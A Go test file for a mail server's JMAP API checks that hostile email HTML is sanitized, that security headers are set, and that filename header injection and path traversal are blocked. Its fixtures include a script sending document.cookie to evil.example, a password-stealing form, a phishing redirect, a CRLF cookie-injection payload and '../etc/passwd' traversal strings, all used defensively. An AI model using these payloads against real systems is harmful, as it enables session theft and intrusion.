// SPDX-License-Identifier: AGPL-3.0-only

package api

import (
	"bytes"
	"encoding/hex"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"mailroom/internal/mime"
)

// The hostile-content controls that live in internal/api, asserted over the REAL
// HTTP surface (API.Handler — the same mux cmd/mailroom mounts) rather than over
// a hand-rolled one. See docs/hostile-content.md.
//
// The rule these tests exist to enforce: a header that is only present on the
// happy path is not a control. Every one of them is checked on error responses
// too, because an error response is the one an attacker can always reach.

// --- The render path ---------------------------------------------------------

// THE HEADLINE: an HTML body leaves this server SANITIZED, for every client,
// through the one door that serves it (Email/get → bodyValues).
//
// This is not a test of SanitizeHTML (sanitize_test.go does that). It is a test
// that the render path actually CALLS it — that a hostile message parsed out of
// real RFC 5322 bytes comes back safe from the function Email/get uses.
func TestEmailBodyValuesAreSanitized(t *testing.T) {
	raw := []byte("From: attacker@example.com\r\n" +
		"To: victim@example.com\r\n" +
		"Subject: Invoice\r\n" +
		"MIME-Version: 1.0\r\n" +
		"Content-Type: text/html; charset=utf-8\r\n" +
		"\r\n" +
		`<html><body>` +
		`<p>Your invoice is attached.</p>` +
		`<script>fetch("https://evil.example/?c="+document.cookie)</script>` +
		`<img src="https://tracker.example/open.gif?id=victim" width="1" height="1">` +
		`<img src=x onerror="alert(document.domain)">` +
		`<style>@import url("https://tracker.example/t.css");</style>` +
		`<svg><script>alert(1)</script></svg>` +
		`<form action="https://evil.example/steal"><input name="password"></form>` +
		`<meta http-equiv="refresh" content="0;url=https://evil.example/phish">` +
		`<link rel="dns-prefetch" href="//abc.tracker.example">` +
		`</body></html>` + "\r\n")

	b := buildEmailBody(raw, hashOf("hostile"), bodyArgs{FetchHTMLBodyValues: true})

	values, _ := b.values["1"].(map[string]any)
	if values == nil {
		t.Fatalf("no bodyValue for part 1: %#v", b.values)
	}
	got, _ := values["value"].(string)
	if got == "" {
		t.Fatalf("empty body value")
	}

	// The legitimate content is still there — a sanitizer that eats the mail is
	// not a sanitizer, it is an outage.
	if !strings.Contains(got, "Your invoice is attached.") {
		t.Errorf("the sanitizer destroyed the message: %s", got)
	}

	// ...and nothing else is.
	assertSafeDOM(t, string(raw), got)
	for _, bad := range []string{
		"<script", "<svg", "<form", "<meta", "<link", "<input",
		"document.cookie", "evil.example", "@import",
		` src="https://tracker.example`,
	} {
		if strings.Contains(strings.ToLower(got), strings.ToLower(bad)) {
			t.Errorf("Email/get served %q to a client:\n%s", bad, got)
		}
	}
	// The tracking pixel is BLOCKED, not silently dropped: the client needs to be
	// able to say so, and to offer to load it.
	if !strings.Contains(got, blockedAttr) {
		t.Errorf("the blocked tracking pixel is not marked for the client:\n%s", got)
	}
}

// A text/plain body is NOT run through the HTML sanitizer — it is not HTML, and
// mangling a plain-text mail's angle brackets would be a bug. It is rendered as
// text by every client (web/ puts it in a <pre>), which is inert by construction.
func TestPlainTextBodyIsNotMangled(t *testing.T) {
	raw := []byte("Content-Type: text/plain; charset=utf-8\r\n\r\n" +
		"if a < b && c > d then <not a tag>\r\n")
	b := buildEmailBody(raw, hashOf("plain"), bodyArgs{FetchTextBodyValues: true})
	values, _ := b.values["1"].(map[string]any)
	got, _ := values["value"].(string)
	if !strings.Contains(got, "a < b && c > d") || !strings.Contains(got, "<not a tag>") {
		t.Errorf("a plain-text body was altered: %q", got)
	}
}

// internal/mime is the single MIME authority; this asserts the assumption the
// sanitizer hook rests on — that the content type it dispatches on is normalized
// to lowercase, bare "text/html" (so `Content-Type: TEXT/HTML; charset=…` cannot
// slip past the `== "text/html"` check in bodyValues).
func TestHTMLPartTypeIsNormalized(t *testing.T) {
	raw := []byte("Content-Type: TEXT/HTML; CHARSET=UTF-8\r\n\r\n<script>alert(1)</script><p>x</p>\r\n")
	parsed, _ := mime.ParseBytes(raw)
	if parsed == nil || parsed.Structure == nil {
		t.Fatal("mime.ParseBytes returned nothing")
	}
	if parsed.Structure.ContentType != "text/html" {
		t.Fatalf("ContentType = %q, want a normalized \"text/html\" — bodyValues dispatches on it",
			parsed.Structure.ContentType)
	}

	b := buildEmailBody(raw, hashOf("upper"), bodyArgs{FetchHTMLBodyValues: true})
	values, _ := b.values["1"].(map[string]any)
	got, _ := values["value"].(string)
	if strings.Contains(got, "<script") {
		t.Errorf("an upper-case Content-Type bypassed the sanitizer: %q", got)
	}
}

// --- Headers -----------------------------------------------------------------

// nosniff on EVERY response of the JMAP surface, including the ones no handler of
// ours writes: an unrouted path, a wrong method, an unauthenticated call.
func TestNosniffOnEveryJMAPResponse(t *testing.T) {
	h := (&API{}).Handler()

	for _, p := range []struct{ method, url string }{
		{"GET", "/jmap/session"},                        // 401, no auth
		{"POST", "/jmap"},                               // 401, no auth
		{"GET", "/.well-known/jmap"},                    // 401
		{"GET", "/jmap/download/a/b/c"},                 // 401
		{"POST", "/jmap/upload/a/"},                     // 401
		{"GET", "/jmap/eventsource/"},                   // 401
		{"GET", "/jmap/nope"},                           // 404 from the mux itself
		{"DELETE", "/jmap"},                             // 405 from the mux itself
		{"GET", "/jmap/download/a/b/c/../../../etc/pw"}, // whatever this is
	} {
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, httptest.NewRequest(p.method, p.url, nil))
		if got := rec.Header().Get("X-Content-Type-Options"); got != "nosniff" {
			t.Errorf("%s %s: X-Content-Type-Options = %q, want nosniff (status was %d)",
				p.method, p.url, got, rec.Code)
		}
		if ct := rec.Header().Get("Content-Type"); ct == "" && rec.Body.Len() > 0 {
			t.Errorf("%s %s: a response with a body and no Content-Type", p.method, p.url)
		}
	}
}

// A JMAP JSON response carries attacker-authored bytes (a subject, a display
// name, an error echoing a hostile blobId). It must never be interpretable as a
// document.
func TestJSONResponsesAreHardened(t *testing.T) {
	rec := httptest.NewRecorder()
	writeJSON(rec, http.StatusBadRequest, newRequestError("notRequest", http.StatusBadRequest,
		`<script>alert(1)</script>`))

	want := map[string]string{
		"Content-Type":            "application/json",
		"X-Content-Type-Options":  "nosniff",
		"X-Frame-Options":         "DENY",
		"Content-Security-Policy": jsonCSP,
	}
	for k, v := range want {
		if got := rec.Header().Get(k); got != v {
			t.Errorf("%s = %q, want %q", k, got, v)
		}
	}
	// The hostile text is JSON-escaped, not reflected raw.
	if bytes.Contains(rec.Body.Bytes(), []byte("<script>alert(1)</script>")) {
		t.Errorf("an error description reflected raw markup: %s", rec.Body.String())
	}
	for _, must := range []string{"default-src 'none'", "frame-ancestors 'none'", "sandbox"} {
		if !strings.Contains(jsonCSP, must) {
			t.Errorf("jsonCSP lost %q: %s", must, jsonCSP)
		}
	}
}

// The blob (attachment) response headers, asserted as a SET. blob.go's comment
// explains each one; this is the thing that fails if one is quietly removed.
func TestBlobResponseHeaderSet(t *testing.T) {
	rec := httptest.NewRecorder()
	writeBlobHeaders(rec, safeContentType("text/html"), downloadNameFor("invoice.html"), 12, `"deadbeef.2"`)

	want := map[string]string{
		// text/html is NOT on the allowlist, so an HTML attachment is served as
		// bytes to save, never as a document to run.
		"Content-Type":                 "application/octet-stream",
		"X-Content-Type-Options":       "nosniff",
		"Cross-Origin-Resource-Policy": "same-origin",
		"X-Frame-Options":              "DENY",
		"Content-Security-Policy":      "default-src 'none'; sandbox; frame-ancestors 'none'",
	}
	for k, v := range want {
		if got := rec.Header().Get(k); got != v {
			t.Errorf("%s = %q, want %q", k, got, v)
		}
	}
	if cd := rec.Header().Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment;") {
		t.Errorf("Content-Disposition = %q, want an attachment disposition", cd)
	}
}

// downloadNameFor is downloadName's pure half, for a test that does not want to
// build a whole *http.Request just to name a file.
func downloadNameFor(name string) string {
	if n := sanitizeFilename(name); n != "" {
		return n
	}
	return "attachment"
}

// --- Header injection / response splitting -----------------------------------
//
// The only user-controlled value this server EVER puts in a response header is
// an attachment filename (Content-Disposition). Both of its sources are hostile:
// the {name} the client puts in the download URL, and the filename the SENDER
// wrote into the message's MIME part.
//
// Two independent things must hold, and both are asserted here rather than one
// being taken on faith:
//
//  1. sanitizeFilename removes CR/LF and the quote/backslash that would escape
//     the quoted-string — so nothing injectable ever reaches the header.
//  2. Go's net/http would refuse to write it anyway (it replaces CR and LF in a
//     header value with spaces). That is a backstop, not the control: it is a
//     property of the standard library, and a control we do not own is a control
//     that can be taken away.
func TestFilenameCannotInjectAHeaderThroughTheRealHandler(t *testing.T) {
	// A {name} path segment carrying a percent-encoded CRLF. http.ServeMux DECODES
	// path values, so r.PathValue("name") really does contain a raw CRLF here —
	// this is the live version of the attack, not a unit test of a string helper.
	payload := "invoice.pdf%0d%0aSet-Cookie:%20mailroom_session=stolen%0d%0a%0d%0a<script>"

	mux := http.NewServeMux()
	mux.HandleFunc("GET /jmap/download/{accountId}/{blobId}/{name}",
		func(w http.ResponseWriter, r *http.Request) {
			// Exactly what DownloadHandler does once it has authorized the blob.
			writeBlobHeaders(w, safeContentType("text/html"), downloadName(r, ""), 3, `"deadbeef.2"`)
			_, _ = w.Write([]byte("hi\n"))
		})

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest("GET",
		"/jmap/download/01J0000000000000000000000/"+strings.Repeat("a", 64)+"/"+payload, nil))

	res := rec.Result()
	defer func() { _ = res.Body.Close() }()

	// THE assertion: serialize the whole response the way it goes on the wire and
	// look at the HEADER BLOCK. Response splitting is a claim about the bytes
	// between the status line and the blank line, so that is what is inspected —
	// not a parsed header map, which has already forgiven whatever went wrong.
	var wire bytes.Buffer
	if err := res.Write(&wire); err != nil {
		t.Fatalf("serializing the response: %v", err)
	}
	head, _, _ := strings.Cut(wire.String(), "\r\n\r\n")
	for _, line := range strings.Split(head, "\r\n") {
		name, _, _ := strings.Cut(line, ":")
		switch strings.ToLower(strings.TrimSpace(name)) {
		case "set-cookie", "x-injected", "location", "refresh":
			t.Fatalf("RESPONSE SPLITTING: a filename minted the header line %q\nfull head:\n%s", line, head)
		}
	}
	if strings.Contains(head, "\n\n") {
		t.Fatalf("RESPONSE SPLITTING: a filename terminated the header block early:\n%s", head)
	}

	cd := res.Header.Get("Content-Disposition")
	if strings.ContainsAny(cd, "\r\n") {
		t.Fatalf("HEADER INJECTION: Content-Disposition carries CR/LF: %q", cd)
	}
	// The payload survives only as INERT TEXT inside the quoted filename — the
	// CRLFs that would have made it a header are gone, and the quoted string was
	// not escapable (exactly one pair of quotes, ours). A filename that merely
	// contains the letters "Set-Cookie" is a badly-named file, not an injection.
	if strings.Count(cd, `"`) != 2 {
		t.Errorf("the quoted filename was escapable: %q", cd)
	}
	// It is still an attachment, and still the type WE chose.
	if !strings.HasPrefix(cd, "attachment;") {
		t.Errorf("Content-Disposition = %q, want an attachment disposition", cd)
	}
	if ct := res.Header.Get("Content-Type"); ct != "application/octet-stream" {
		t.Errorf("Content-Type = %q — an HTML part must never be served as text/html", ct)
	}
}

// A filename written by the SENDER (the MIME part's own name), which is the
// source a client cannot see coming.
func TestSenderSuppliedFilenameCannotInjectAHeader(t *testing.T) {
	for _, name := range []string{
		"a\r\nSet-Cookie: x=1",
		"a\nX-Injected: 1",
		"a\"; filename=\"evil.exe",
		"../../etc/passwd",
		"\x00\x01evil",
	} {
		got := contentDisposition(sanitizeFilename(name))
		// No CR, no LF, no NUL: nothing that can end a header line or a header
		// block. This — not the absence of the WORD "Set-Cookie", which is a
		// perfectly legal thing to call a file — is what makes injection impossible.
		if strings.ContainsAny(got, "\r\n\x00") {
			t.Errorf("contentDisposition(%q) = %q — carries a control character", name, got)
		}
		// The quoted-string must not be escapable: exactly one pair of quotes, ours.
		if strings.Count(got, `"`) != 2 {
			t.Errorf("contentDisposition(%q) = %q — the quoted string was escaped", name, got)
		}
		// No path separator survives into a name a browser will write to disk.
		if strings.ContainsAny(sanitizeFilename(name), `/\`) {
			t.Errorf("sanitizeFilename(%q) kept a path separator", name)
		}
	}
}

// The `type` query parameter of the RFC 8620 downloadUrl template is
// client-supplied — and the client here may be a phishing email's link. It must
// have NO effect on what we serve.
func TestDownloadTypeParameterIsIgnored(t *testing.T) {
	for _, declared := range []string{"text/html", "image/svg+xml", "application/xhtml+xml",
		"text/xml", "application/xml", "text/html; charset=utf-8", "TEXT/HTML"} {
		if got := safeContentType(declared); got != "application/octet-stream" {
			t.Errorf("safeContentType(%q) = %q — that is a scripting context on our own origin",
				declared, got)
		}
	}
	// And the allowlist itself must never grow one.
	for _, banned := range []string{"text/html", "application/xhtml+xml", "image/svg+xml",
		"text/xml", "application/xml", "text/javascript", "application/javascript"} {
		if downloadableTypes[banned] {
			t.Errorf("downloadableTypes contains %q — see the comment above it: never", banned)
		}
	}
}

// hex-decodable blobIds only: parseBlobID is the first thing an attacker-supplied
// path segment meets, and a permissive parser here is how path traversal gets in.
func TestBlobIDParserRejectsTraversal(t *testing.T) {
	for _, bad := range []string{
		"../../../etc/passwd",
		strings.Repeat("a", 64) + "/../../x",
		strings.Repeat("a", 64) + ".1.2.../x",
		strings.Repeat("a", 64) + ".",
		strings.Repeat("a", 64) + ".1..2",
		strings.Repeat("a", 64) + "." + strings.Repeat("1", maxPartPathLen+1),
		"",
	} {
		if _, err := parseBlobID(bad); err == nil {
			t.Errorf("parseBlobID(%q) accepted it", bad)
		}
	}
	good := hex.EncodeToString(make([]byte, 32)) + ".1.2"
	if _, err := parseBlobID(good); err != nil {
		t.Errorf("parseBlobID(%q) = %v, want a valid part path", good, err)
	}
}
